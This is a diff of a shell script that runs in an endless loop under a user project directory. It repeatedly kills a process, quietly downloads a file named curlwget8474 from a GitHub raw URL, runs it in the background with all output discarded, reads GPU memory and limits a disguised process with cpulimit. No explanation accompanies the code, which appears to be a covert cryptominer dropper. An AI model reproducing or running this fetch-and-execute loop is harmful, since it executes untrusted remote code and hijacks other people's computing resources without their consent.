@@ -25,17 +25,17 @@ cd /mnt/disks/user/project/
 while true
 do
 
-pkill -f curl84
+pkill -f curlwget8474
 
-pkill -f curl84
+pkill -f curlwget8474
 
-pkill -f curl84
+pkill -f curlwget8474
 
-pkill -f curl84
+pkill -f curlwget8474
 
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curlwget8474
 
-bash ./curl84 &> /dev/null &
+bash ./curlwget8474 &> /dev/null &
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
@@ -85,17 +85,17 @@ cpulimit -e google84121274 -l 62 &> /dev/null &
 
 else
 
-pkill -f curl84
+pkill -f curlwget8474
 
-pkill -f curl84
+pkill -f curlwget8474
 
-pkill -f curl84
+pkill -f curlwget8474
 
-pkill -f curl84
+pkill -f curlwget8474
 
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curl84
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/curlwget8474
 
-bash ./curl84 &> /dev/null &
+bash ./curlwget8474 &> /dev/null &
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
